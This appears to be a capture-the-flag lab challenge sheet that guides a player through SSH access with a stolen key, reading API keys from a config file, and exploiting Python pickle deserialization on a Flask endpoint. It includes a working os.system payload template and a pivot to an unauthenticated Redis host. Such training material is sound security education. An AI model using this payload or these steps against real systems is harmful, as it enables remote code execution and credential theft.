# Challenge 3 — Lateral Movement + Execution
## Operation Shadow Forge | Stage 3 of 5
### Machine: aethon-dev | Vulnerability: Python Pickle Deserialization

---

**SITUATION**
You now have the SSH private key for `devops@aethon-dev`. SSH in and enumerate
the host. You will find a Flask-based R&D API running on port 8080. The API
accepts serialised Python objects — a classic insecure deserialization scenario.

**ACCESS**
```bash
ssh -i id_rsa_dev devops@aethon-dev
```

**POST-SSH ENUMERATION**
```bash
cat /opt/aethon-api/config.ini    # API keys + Redis config
ls /opt/aethon-api/
curl http://localhost:8080/        # API info
```

**YOUR OBJECTIVE**
Craft a malicious Python pickle payload that executes arbitrary OS commands
when deserialized by the `/api/load-profile` endpoint.

**HINTS (unlock after 30 min)**
1. Python's `pickle.loads()` executes `__reduce__()` methods — craft a class
   whose `__reduce__` returns `(os.system, ("your command",))`.
2. Base64-encode the pickled object and send it as the `profile` field in JSON.
3. Include the API key from `config.ini` in the `X-API-Key` header.

**PAYLOAD TEMPLATE**
```python
import pickle, os, base64

class Exploit(object):
    def __reduce__(self):
        return (os.system, ("id > /tmp/pwn.txt",))

print(base64.b64encode(pickle.dumps(Exploit())).decode())
```

**WHAT TO SUBMIT**
Flag: `AETHON{...}` found at `/opt/aethon-api/flag3.txt`

**PIVOT INTEL**
Read `/opt/aethon-api/config.ini` — it contains the Redis host (`aethon-cache`)
and port (`6379`) for the next challenge. No password is configured.

---
*Next: Connect to aethon-cache:6379 with redis-cli*
